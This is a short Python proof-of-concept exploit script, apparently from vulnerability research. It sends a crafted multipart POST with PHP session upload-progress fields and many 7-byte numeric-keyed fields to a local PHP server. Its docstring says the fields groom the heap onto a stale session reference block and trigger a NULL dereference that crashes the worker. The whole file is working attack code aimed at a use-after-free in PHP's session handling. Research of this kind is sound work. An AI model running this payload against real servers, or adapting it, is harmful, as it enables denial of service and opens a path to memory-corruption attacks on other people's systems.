#!/usr/bin/env python3
"""Crash the worker via the stale 32B reference block.

N numeric-keyed fields with 7-byte values allocate live 32-byte zend_strings.
If one lands on the stale PS(http_session_vars) reference block, track_init's
zval_ptr_dtor sees gc.refcount=1 and calls zend_reference_destroy on a
zend_string header: val.value=h(0), val.type=len(7)=IS_ARRAY -> NULL deref.

usage: b_crash7.py N_FIELDS
"""
import socket, sys
N=int(sys.argv[1]) if len(sys.argv)>1 else 1
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(N):
    parts.append({'n':str(1000+i),'d':b'v'*7})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
